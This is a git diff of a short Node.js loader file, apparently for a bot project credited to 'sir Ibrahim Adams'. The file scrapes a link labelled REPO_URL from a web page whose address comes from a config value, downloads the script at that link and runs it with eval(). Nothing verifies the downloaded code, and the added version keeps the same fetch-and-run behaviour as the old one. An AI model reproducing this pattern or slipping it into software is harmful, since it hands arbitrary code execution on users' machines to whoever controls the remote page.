@@ -1,28 +1,35 @@
-'use strict';
+/*
+🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
+Made by sir Ibrahim Adams
+*/
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchRepoUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
+try {
 
-        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
+const response = await axios.get(adams.BWM_XMD);      
+const $ = cheerio.load(response.data);      
+  
+  
+const repoUrlElement = $('a:contains("REPO_URL")');      
+const repoUrl = repoUrlElement.attr('href');      
+  
+if (!repoUrl) {      
+  throw new Error('Repo url link not found...');      
+}      
+  
+console.log('Repo url fetched successfully ✅');      
+  
+  
+const scriptResponse = await axios.get(repoUrl);      
+eval(scriptResponse.data);
 
-        console.log('REPO_URL fetched successfully:', repoUrl);
-
-        const scriptResponse = await axios.get(repoUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("REPO_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching REPO_URL:', error.message);
-    }
+} catch (error) {
+console.error('Error:', error.message);
+}
 }
 
 fetchRepoUrl();
